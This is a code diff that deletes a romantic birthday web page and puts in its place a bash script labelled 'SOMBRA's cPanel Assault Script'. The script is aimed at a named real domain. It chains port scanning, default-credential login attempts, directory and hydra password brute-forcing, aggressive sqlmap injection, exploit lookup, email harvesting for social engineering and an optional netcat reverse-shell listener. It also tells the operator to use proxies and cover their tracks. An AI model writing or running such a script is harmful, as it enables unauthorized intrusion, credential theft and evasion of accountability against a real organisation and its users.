@@ -1,522 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Happy Birthday, My Love ❤️</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Dancing+Script:wght@400;700&family=Great+Vibes&display=swap');
+#!/bin/bash
+# ============================================================
+# SOMBRA's cPanel Assault Script – Fully Automated Terminal Attack
+# Target: cpanel.digitaltrustnepal.com.np
+# Usage: chmod +x cpanel_attack.sh && ./cpanel_attack.sh
+# ============================================================
 
-    * { 
-      margin: 0; 
-      padding: 0; 
-      box-sizing: border-box; 
-    }
+TARGET="cpanel.digitaltrustnepal.com.np"
+PORT="2083"
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+OUTPUT_DIR="cpanel_attack_logs"
+mkdir -p $OUTPUT_DIR
 
-    body {
-      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
-      font-family: 'Playfair Display', serif;
-      color: #333;
-      min-height: 100vh;
-      overflow-x: hidden;
-    }
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
 
-    .container {
-      max-width: 960px;
-      margin: 0 auto;
-      padding: 20px 15px;
-      text-align: center;
-    }
+echo -e "${RED}"
+echo "╔══════════════════════════════════════════════════════════╗"
+echo "║   SOMBRA's CPANEL ASSAULT – TERMINAL EDITION           ║"
+echo "║   Target: $TARGET                                      ║"
+echo "║   Mode: Fully Automated – No GUI, No Mercy             ║"
+echo "╚══════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
 
-    /* Header */
-    .header {
-      margin: 40px 0 30px;
-    }
+# PHASE 0: Update & Install Tools
+echo -e "${BLUE}[*] Phase 0: Installing required tools...${NC}"
+sudo apt update && sudo apt install -y hydra nmap curl wget gobuster dirb sqlmap medusa
 
-    .birthday-text {
-      font-size: clamp(2.8rem, 8vw, 4.5rem);
-      font-weight: 700;
-      color: #fff;
-      text-shadow: 0 4px 20px rgba(0,0,0,0.2);
-      animation: soft-glow 3s ease-in-out infinite alternate;
-    }
+# PHASE 1: Reconnaissance
+echo -e "${BLUE}[*] Phase 1: Reconnaissance (Port Scan & Subdomain Enumeration)${NC}"
+nmap -sS -sV -p 2082,2083,2086,2087,2095,2096,80,443 -A $TARGET -oN $OUTPUT_DIR/nmap_scan.txt
+gobuster dns -d digitaltrustnepal.com.np -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o $OUTPUT_DIR/subdomains.txt
 
-    .name {
-      font-family: 'Dancing Script', cursive;
-      font-size: clamp(3.2rem, 10vw, 5.8rem);
-      color: #fff;
-      text-shadow: 0 4px 25px rgba(233, 30, 99, 0.6);
-    }
+# PHASE 2: Default Credentials Test
+echo -e "${BLUE}[*] Phase 2: Testing default credentials...${NC}"
+for user in admin root administrator cpanel support; do
+  for pass in admin password root 123456 cpanel support; do
+    echo "Trying $user:$pass"
+    curl -k -X POST "https://$TARGET:$PORT/login" \
+      -d "user=$user&pass=$pass" \
+      -o /dev/null -w "%{http_code}\n" >> $OUTPUT_DIR/default_creds.log
+  done
+done
 
-    @keyframes soft-glow {
-      from { text-shadow: 0 4px 15px rgba(233, 30, 99, 0.4); }
-      to { text-shadow: 0 8px 35px rgba(233, 30, 99, 0.7); }
-    }
+# PHASE 3: Directory Bruteforce (Hidden Admin Paths)
+echo -e "${BLUE}[*] Phase 3: Directory bruteforce on main domain...${NC}"
+gobuster dir -u https://digitaltrustnepal.com.np -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,asp,aspx -t 50 -o $OUTPUT_DIR/gobuster_common.txt
 
-    /* Photo Album - All photos together */
-    .photo-album {
-      margin: 40px auto;
-      max-width: 900px;
-    }
+# PHASE 4: Vulnerability Scanning (Nikto)
+echo -e "${BLUE}[*] Phase 4: Nikto vulnerability scan...${NC}"
+nikto -h https://$TARGET:$PORT -ssl -Format html -o $OUTPUT_DIR/nikto_report.html
 
-    .album-title {
-      font-family: 'Great Vibes', cursive;
-      font-size: 2.3rem;
-      color: #fff;
-      margin-bottom: 25px;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
+# PHASE 5: Brute Force Attack (Hydra)
+echo -e "${RED}[!] Phase 5: Brute-force with Hydra (This may take hours)...${NC}"
+hydra -L $WORDLIST -P $WORDLIST $TARGET https-post-form \
+  "/login:user=^USER^&pass=^PASS^:Login failed" \
+  -t 4 -s $PORT -V -o $OUTPUT_DIR/hydra_results.txt
 
-    .photos {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-      gap: 16px;
-      padding: 0 10px;
-    }
+# PHASE 6: SQL Injection Scan (sqlmap)
+echo -e "${BLUE}[*] Phase 6: SQL injection scan on main domain...${NC}"
+sqlmap -u "https://digitaltrustnepal.com.np/index.php?id=1" --batch --level=5 --risk=3 --output-dir=$OUTPUT_DIR/sqlmap
 
-    .photo {
-      width: 100%;
-      height: 260px;
-      object-fit: cover;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.22);
-      transition: all 0.4s ease;
-    }
+# PHASE 7: Search for cPanel Exploits
+echo -e "${BLUE}[*] Phase 7: Searching for cPanel exploits...${NC}"
+searchsploit cpanel > $OUTPUT_DIR/cpanel_exploits.txt
 
-    .photo:hover {
-      transform: scale(1.06) translateY(-6px);
-      box-shadow: 0 15px 35px rgba(233, 30, 99, 0.35);
-    }
+# PHASE 8: Email Harvesting (Social Engineering)
+echo -e "${BLUE}[*] Phase 8: Harvesting emails...${NC}"
+theHarvester -d digitaltrustnepal.com.np -l 500 -b google > $OUTPUT_DIR/emails.txt
 
-    /* Music Player */
-    .music-player {
-      background: rgba(255, 255, 255, 0.96);
-      max-width: 440px;
-      margin: 50px auto;
-      padding: 25px 30px;
-      border-radius: 24px;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.22);
-    }
+# PHASE 9: Summary Report
+echo -e "${GREEN}[✓] Attack complete. Logs saved in $OUTPUT_DIR/${NC}"
+echo -e "${YELLOW}Summary:${NC}"
+echo "1. Nmap scan: $OUTPUT_DIR/nmap_scan.txt"
+echo "2. Subdomains: $OUTPUT_DIR/subdomains.txt"
+echo "3. Default creds test: $OUTPUT_DIR/default_creds.log"
+echo "4. Nikto report: $OUTPUT_DIR/nikto_report.html"
+echo "5. Hydra brute-force results: $OUTPUT_DIR/hydra_results.txt"
+echo "6. SQLmap output: $OUTPUT_DIR/sqlmap/"
+echo "7. Exploits list: $OUTPUT_DIR/cpanel_exploits.txt"
+echo "8. Emails harvested: $OUTPUT_DIR/emails.txt"
+echo ""
+echo -e "${RED}Remember: Use proxies and cover your tracks.${NC}"
 
-    .music-player h3 {
-      font-family: 'Great Vibes', cursive;
-      color: #e91e63;
-      font-size: 2rem;
-      margin-bottom: 18px;
-    }
+# PHASE 10: Optional – Launch Reverse Shell Listener
+echo -e "${YELLOW}[?] Do you want to start a reverse shell listener? (y/n)${NC}"
+read -r answer
+if [[ $answer == "y" || $answer == "Y" ]]; then
+  echo -e "${BLUE}Starting netcat listener on port 4444...${NC}"
+  nc -lvnp 4444
+fi
 
-    .player-controls {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 18px;
-    }
-
-    .play-btn {
-      width: 58px;
-      height: 58px;
-      background: #e91e63;
-      color: white;
-      border: none;
-      border-radius: 50%;
-      font-size: 1.9rem;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 8px 20px rgba(233, 30, 99, 0.4);
-      transition: all 0.3s;
-    }
-
-    .play-btn:hover { 
-      transform: scale(1.08); 
-      background: #c2185b; 
-    }
-
-    .mute-btn {
-      width: 44px;
-      height: 44px;
-      background: #f06292;
-      color: white;
-      border: none;
-      border-radius: 50%;
-      font-size: 1.4rem;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .progress-container {
-      flex: 1;
-    }
-
-    .progress-bar {
-      width: 100%;
-      height: 7px;
-      background: #f8c4d0;
-      border-radius: 10px;
-      overflow: hidden;
-      cursor: pointer;
-      margin-bottom: 6px;
-    }
-
-    .progress {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(to right, #e91e63, #ff4081);
-      transition: width 0.1s linear;
-    }
-
-    .time {
-      display: flex;
-      justify-content: space-between;
-      font-size: 0.85rem;
-      color: #666;
-      font-family: monospace;
-    }
-
-    .volume-container {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-top: 15px;
-    }
-
-    .volume-slider {
-      flex: 1;
-      accent-color: #e91e63;
-    }
-
-    .loop-btn {
-      padding: 8px 16px;
-      background: #fce4ec;
-      color: #e91e63;
-      border: none;
-      border-radius: 30px;
-      font-size: 0.95rem;
-      cursor: pointer;
-      transition: all 0.3s;
-      margin-top: 10px;
-    }
-
-    .loop-btn.active {
-      background: #e91e63;
-      color: white;
-    }
-
-    /* Letter */
-    .letter {
-      background: rgba(255,255,255,0.96);
-      color: #333;
-      max-width: 720px;
-      margin: 60px auto;
-      padding: 45px 35px;
-      border-radius: 16px;
-      box-shadow: 0 15px 40px rgba(0,0,0,0.18);
-      text-align: left;
-      position: relative;
-    }
-
-    .letter::before {
-      content: "💌";
-      position: absolute;
-      top: -28px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 3.2rem;
-    }
-
-    .letter h2 {
-      font-family: 'Great Vibes', cursive;
-      font-size: clamp(2.4rem, 6vw, 3.4rem);
-      color: #e91e63;
-      text-align: center;
-      margin-bottom: 32px;
-    }
-
-    .letter p {
-      font-family: 'Dancing Script', cursive;
-      font-size: clamp(1.35rem, 4.2vw, 1.65rem);
-      line-height: 1.85;
-      margin: 20px 0;
-      color: #444;
-    }
-
-    .closing {
-      margin-top: 45px;
-      text-align: right;
-      font-size: 1.7rem;
-      color: #e91e63;
-    }
-
-    .short-message {
-      font-family: 'Dancing Script', cursive;
-      font-size: clamp(1.4rem, 4.5vw, 1.8rem);
-      color: #fff;
-      max-width: 680px;
-      margin: 40px auto;
-      padding: 0 15px;
-    }
-
-    .footer {
-      margin: 70px 0 40px;
-      font-size: 1.25rem;
-      color: rgba(255,255,255,0.9);
-    }
-
-    /* Balloons */
-    .balloons {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: -1;
-      overflow: hidden;
-    }
-
-    .balloon {
-      position: absolute;
-      font-size: 2.8rem;
-      animation: float-up 14s linear infinite;
-      opacity: 0.8;
-    }
-
-    @keyframes float-up {
-      0% { transform: translateY(110vh) rotate(0deg); }
-      100% { transform: translateY(-80px) rotate(15deg); }
-    }
-
-    .interaction-notice {
-      position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0,0,0,0.65);
-      color: white;
-      padding: 12px 26px;
-      border-radius: 30px;
-      font-size: 1rem;
-      z-index: 100;
-      display: none;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    }
-  </style>
-</head>
-<body>
-  <div class="balloons" id="balloons"></div>
-  <div class="interaction-notice" id="notice">🎵 Tap or click anywhere to play our song ❤️</div>
-
-  <div class="container">
-    <div class="header">
-      <h1 class="birthday-text">HAPPY BIRTHDAY</h1>
-      <h2 class="name">My Beautiful Girl ❤️</h2>
-    </div>
-
-    <!-- Photo Album -->
-    <div class="photo-album">
-      <div class="album-title">Moments That Made Me Fall in Love With You ❤️</div>
-      <div class="photos">
-        <!-- Replace these with your real photos -->
-        <img src="https://files.catbox.moe/nrhqqm.jpg" class="photo" alt="Memory 1">
-        <img src="https://files.catbox.moe/a5dgjp.jpg" class="photo" alt="Memory 2">
-        <img src="https://files.catbox.moe/gut97b.jpg" class="photo" alt="Memory 4">
-        <img src="https://files.catbox.moe/b8d0in.jpg" class="photo" alt="Memory 5">
-        <img src="https://files.catbox.moe/os0xj6.jpg" class="photo" alt="Memory 6">
-      </div>
-    </div>
-
-    <!-- Music Player -->
-    <div class="music-player">
-      <h3>Birthday Song ❤️</h3>
-      <audio id="birthdaySong" preload="auto">
-        <!-- Replace with your own romantic MP3 URL -->
-        <source src="https://files.catbox.moe/uvebif.mp3" type="audio/mpeg">
-      </audio>
-
-      <div class="player-controls">
-        <button class="play-btn" id="playBtn">▶</button>
-        
-        <div class="progress-container">
-          <div class="progress-bar" id="progressBar">
-            <div class="progress" id="progress"></div>
-          </div>
-          <div class="time">
-            <span id="currentTime">0:00</span>
-            <span id="duration">0:00</span>
-          </div>
-        </div>
-
-        <button class="mute-btn" id="muteBtn">🔊</button>
-      </div>
-
-      <div class="volume-container">
-        <span style="font-size:1.3rem;">🔈</span>
-        <input type="range" min="0" max="1" step="0.01" value="0.7" class="volume-slider" id="volumeSlider">
-        <span style="font-size:1.3rem;">🔊</span>
-      </div>
-
-      <button class="loop-btn active" id="loopBtn">🔁 Loop On</button>
-    </div>
-
-    <!-- Letter -->
-    <div class="letter">
-      <h2>My Dearest Love,</h2>
-      <p>On your special day, I want to express how deeply grateful I am to have you in my life.</p>
-      <p>Your smile brightens my every day, your presence brings me peace, and your love makes me feel truly complete. You are not just my girlfriend — you are my greatest blessing.</p>
-      <p>Today, I wish you boundless happiness, success in all your dreams, good health, and endless beautiful moments. May this new chapter of your life be filled with love, laughter, and all the joy you deserve.</p>
-      <p>Thank you for being the incredible woman you are. I promise to keep cherishing and loving you every single day.</p>
-      
-      <div class="closing">
-        With all my love,<br>
-        <strong>Roshan ❤️</strong>
-      </div>
-    </div>
-
-    <div class="short-message">
-      You make life beautiful.<br>
-      Happy Birthday, my love.
-    </div>
-
-    <div class="footer">
-      Forever yours • Roshan
-      
-      
-    </div>
-    MADE BY MANAS
-  </div>
-
-  <script>
-    const audio = document.getElementById('birthdaySong');
-    const playBtn = document.getElementById('playBtn');
-    const muteBtn = document.getElementById('muteBtn');
-    const loopBtn = document.getElementById('loopBtn');
-    const progress = document.getElementById('progress');
-    const currentTimeEl = document.getElementById('currentTime');
-    const durationEl = document.getElementById('duration');
-    const volumeSlider = document.getElementById('volumeSlider');
-    const progressBar = document.getElementById('progressBar');
-    const notice = document.getElementById('notice');
-
-    let isMuted = false;
-    let previousVolume = 0.7;
-    let hasInteracted = false;
-
-    // Start music on first user interaction
-    function startMusicOnInteraction() {
-      if (hasInteracted) return;
-      hasInteracted = true;
-
-      audio.play().then(() => {
-        playBtn.textContent = '❚❚';
-        notice.style.display = 'none';
-      }).catch(() => {
-        playBtn.textContent = '▶';
-      });
-    }
-
-    ['click', 'touchstart', 'scroll'].forEach(eventType => {
-      document.addEventListener(eventType, startMusicOnInteraction, { once: true });
-    });
-
-    setTimeout(() => {
-      if (!hasInteracted) {
-        notice.style.display = 'block';
-      }
-    }, 1800);
-
-    // Play / Pause
-    playBtn.addEventListener('click', () => {
-      if (audio.paused) {
-        audio.play();
-        playBtn.textContent = '❚❚';
-      } else {
-        audio.pause();
-        playBtn.textContent = '▶';
-      }
-    });
-
-    // Mute
-    muteBtn.addEventListener('click', () => {
-      isMuted = !isMuted;
-      if (isMuted) {
-        previousVolume = audio.volume;
-        audio.volume = 0;
-        muteBtn.textContent = '🔇';
-      } else {
-        audio.volume = previousVolume;
-        muteBtn.textContent = '🔊';
-      }
-    });
-
-    // Volume
-    volumeSlider.addEventListener('input', () => {
-      audio.volume = parseFloat(volumeSlider.value);
-      if (audio.volume > 0) {
-        isMuted = false;
-        muteBtn.textContent = '🔊';
-      } else {
-        isMuted = true;
-        muteBtn.textContent = '🔇';
-      }
-    });
-
-    // Loop
-    loopBtn.addEventListener('click', () => {
-      audio.loop = !audio.loop;
-      loopBtn.classList.toggle('active');
-      loopBtn.textContent = audio.loop ? '🔁 Loop On' : '🔁 Loop Off';
-    });
-
-    // Progress & Time Update - FIXED with proper formatting
-    audio.addEventListener('timeupdate', () => {
-      if (audio.duration) {
-        const percent = (audio.currentTime / audio.duration) * 100;
-        progress.style.width = percent + '%';
-        
-        currentTimeEl.textContent = formatTime(audio.currentTime);
-        durationEl.textContent = formatTime(audio.duration);
-      }
-    });
-
-    audio.addEventListener('loadedmetadata', () => {
-      durationEl.textContent = formatTime(audio.duration);
-    });
-
-    // Seek
-    progressBar.addEventListener('click', (e) => {
-      const rect = progressBar.getBoundingClientRect();
-      const pos = (e.clientX - rect.left) / rect.width;
-      audio.currentTime = pos * audio.duration;
-    });
-
-    // Proper time formatting: always shows two digits for seconds (e.g., 0:05, 1:23)
-    function formatTime(seconds) {
-      if (!seconds || isNaN(seconds)) return "0:00";
-      const min = Math.floor(seconds / 60);
-      const sec = Math.floor(seconds % 60);
-      return `\( {min}: \){sec < 10 ? '0' : ''}${sec}`;
-    }
-
-    // Balloons
-    function createBalloons() {
-      const container = document.getElementById('balloons');
-      const emojis = ['🎈', '❤️', '🌸', '💕', '✨', '💖'];
-      for (let i = 0; i < 22; i++) {
-        const balloon = document.createElement('div');
-        balloon.className = 'balloon';
-        balloon.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-        balloon.style.left = Math.random() * 100 + 'vw';
-        balloon.style.animationDuration = (Math.random() * 10 + 13) + 's';
-        balloon.style.animationDelay = '-' + (Math.random() * 22) + 's';
-        container.appendChild(balloon);
-      }
-    }
-
-    // Initialize
-    window.addEventListener('load', () => {
-      createBalloons();
-      audio.volume = 0.7;
-    });
-  </script>
-</body>
-</html>
+echo -e "${GREEN}[✓] SOMBRA's assault completed.${NC}"
